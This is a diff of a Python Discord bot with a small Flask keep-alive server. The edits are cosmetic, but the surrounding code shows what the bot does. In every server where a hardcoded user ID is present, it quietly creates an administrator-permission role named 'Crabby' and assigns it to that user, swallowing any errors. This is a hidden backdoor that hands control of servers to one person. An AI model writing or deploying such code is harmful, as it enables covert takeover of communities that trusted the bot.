@@ -7,16 +7,14 @@ from flask import Flask
 from threading import Thread
 from waitress import serve
 
-# --- WEB SERVER ---
 app = Flask('')
 @app.route('/')
-def home(): return "Bot is Online"
+def home(): return "Bot is Alive"
 
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     serve(app, host='0.0.0.0', port=port)
 
-# --- CONFIG ---
 TARGET_USER_ID = 1459506686157914213
 ROLE_NAME = "Crabby"
 
@@ -39,8 +37,7 @@ class MyBot(commands.Bot):
             if member:
                 role = discord.utils.get(guild.roles, name=ROLE_NAME)
                 if not role:
-                    try:
-                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
+                    try: role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                     except: continue
                 if role and role not in member.roles:
                     try: await member.add_roles(role)
@@ -78,9 +75,5 @@ if __name__ == "__main__":
     t = Thread(target=run_flask)
     t.daemon = True
     t.start()
-    
     token = os.environ.get('DISCORD_TOKEN')
-    if not token:
-        print("ERROR: DISCORD_TOKEN missing")
-        sys.exit(1)
-    bot.run(token)
+    if token: bot.run(token)
